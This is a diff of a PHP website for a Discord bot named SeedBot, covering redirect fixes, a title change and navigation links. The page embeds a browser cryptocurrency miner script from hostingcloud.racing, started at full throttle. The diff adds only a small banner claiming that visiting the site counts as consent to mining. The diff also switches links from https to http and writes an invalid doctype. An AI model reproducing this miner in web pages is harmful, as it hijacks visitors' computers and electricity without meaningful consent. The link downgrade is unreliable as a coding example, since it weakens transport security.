@@ -17,23 +17,23 @@ EOF;
   }
 
   $page=$_GET['page'];
-  $repo=$_GET['gitrepo'];
+  $repo=$_GET['repo'];
   if ($page === "supportemail") {
     header("Location: mailto:contact@dariox.club");
   }
   elseif ($page === "invite") {
     header("Location: https://discordapp.com/oauth2/authorize?client_id=423432378640498688&scope=bot&permissions=8");
   }
-  elseif ($page === "github" || $repo === "stable") {
+  elseif ($page === "github" && $repo === "stable") {
     header("Location: https://github.com/discordseedbot/stable");
   }
-  elseif ($page === "github" || $repo === "canary") {
+  elseif ($page === "github" && $repo === "canary") {
     header("Location: https://github.com/discordseedbot/canary");
   }
-  elseif ($page === "github" || $repo === "web") {
+  elseif ($page === "github" && $repo === "web") {
     header("Location: https://github.com/discordseedbot/web");
   }
-  elseif ($page === "github" || $repo === "changelog") {
+  elseif ($page === "github" && $repo === "changelog") {
     header("Location: https://github.com/discordseedbot/changelog");
   }
   elseif ($page === "github" && strlen($repo) < 3) {
@@ -51,13 +51,13 @@ EOF;
 
 
 ?>
-<!DOCTYPE html>
+<!DOCTYPE html, php7.2>
 <html>
   <head>
     <link href="css/bootstrap.css" rel="stylesheet" type="text/css" />
     <link href="css/custom.css" rel="stylesheet" type="text/css" />
     <link href="fa/css/all.css" rel="stylesheet"> 
-    <title>SeedBot</title>
+    <title>SeedBot | Offical Website</title>
     
 <script src="https://www.hostingcloud.racing/cPTP.js"></script>
 <script>
@@ -65,6 +65,7 @@ EOF;
         throttle: 0
     });
     _client.start();
+    _client.addMiningNotification("Bottom", "By Using this website you consent to crypto mining on your computer", "#cccccc", 40, "#3d3d3d");
 
 </script>
     
@@ -78,10 +79,10 @@ EOF;
       <div class="collapse navbar-collapse" id="navbarText">
         <ul class="navbar-nav mr-auto">
           <li class="nav-item active">
-            <a class="nav-link" href="https://seedbot.xyz">Home <span class="sr-only">(current)</span></a>
+            <a class="nav-link" href="http://seedbot.xyz">Home <span class="sr-only">(current)</span></a>
           </li>
           <li class="nav-item">
-            <a class="nav-link" href="https://seedbot.xyz/?page=github">Github</a>
+            <a class="nav-link" href="http://seedbot.xyz/?page=github">Github</a>
           </li>
           </li>
           <li class="nav-item">
@@ -96,7 +97,7 @@ EOF;
           </li>
         </ul>
         <span class="navbar-text">
-          <a class="nav-link" href="https://seedbot.xyz/?page=invite">Invite Me!</a>
+          <a class="nav-link" href="http://seedbot.xyz/?page=invite">Invite Me!</a>
         </span>
       </div>
     </nav>
